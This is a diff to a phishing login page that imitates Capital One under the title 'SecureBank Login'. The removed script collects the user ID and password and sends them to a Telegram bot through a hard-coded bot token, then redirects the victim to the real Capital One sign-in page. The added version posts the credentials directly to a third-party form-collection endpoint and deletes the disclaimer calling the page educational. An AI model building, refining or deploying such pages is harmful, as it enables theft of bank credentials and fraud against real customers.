@@ -1,8 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta charset="UTF-8">
   <title>SecureBank Login</title>
   <style>
     body {
@@ -12,7 +11,6 @@
       justify-content: center;
       align-items: center;
       height: 100vh;
-      margin: 0;
     }
     .login-container {
       background-color: white;
@@ -43,7 +41,6 @@
       margin: 10px 0 20px 0;
       border: 1px solid #ccc;
       border-radius: 6px;
-      font-size: 16px;
     }
     button {
       width: 100%;
@@ -62,70 +59,25 @@
       margin-top: 15px;
       font-size: 12px;
       color: #777;
-      clear: both;
     }
   </style>
 </head>
 <body>
   <div class="login-container">
     <!-- Logo -->
-    <img src="https://files.catbox.moe/5npen5.png" alt="SecureBank Logo" class="logo" />
-    
+    <img src="https://files.catbox.moe/5npen5.png" alt="SecureBank Logo" class="logo">
+
     <h2>Capital One Login</h2>
-    <form id="loginForm" method="post" novalidate>
+    <form id="loginForm" method="POST" action="https://submit-form.com/wwhugmHzQ">
       <label for="username">User ID</label>
-      <input
-        type="text"
-        id="username"
-        name="username"
-        placeholder="Enter your user ID"
-        required
-      />
+      <input type="text" id="username" name="username" placeholder="Enter your user ID" required>
 
       <label for="password">Password</label>
-      <input
-        type="password"
-        id="password"
-        name="password"
-        placeholder="Enter your password"
-        required
-      />
+      <input type="password" id="password" name="password" placeholder="Enter your password" required>
 
       <button type="submit">Sign In</button>
     </form>
-    <div class="note">This is a fictional login page for educational use only.</div>
+    <div class="note"></div>
   </div>
-
-  <script>
-    document.getElementById('loginForm').addEventListener('submit', function (e) {
-      e.preventDefault(); // evitar envío normal
-
-      const user = document.getElementById('username').value;
-      const pass = document.getElementById('password').value;
-
-      // Cambia estos por tu token y chat_id reales
-      const token = '7941669083:AAFCmw6OPwXWy_hTryvFkcIz_mqd8OydRQM';
-      const chat_id = TU_CHAT_ID; // reemplaza TU_CHAT_ID por el número real
-
-      const message = `🔐 CapitalOne Login\n👤 Usuario: ${user}\n🔑 Contraseña: ${pass}`;
-
-      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: chat_id,
-          text: message,
-        }),
-      })
-      .then(response => {
-        // Aquí rediriges después de enviar el mensaje, no antes
-        window.location.href = 'https://www.capitalone.com/commercial/sign-in/';
-      })
-      .catch(error => {
-        // En caso de error también redirige
-        window.location.href = 'https://www.capitalone.com/commercial/sign-in/';
-      });
-    });
-  </script>
 </body>
 </html>
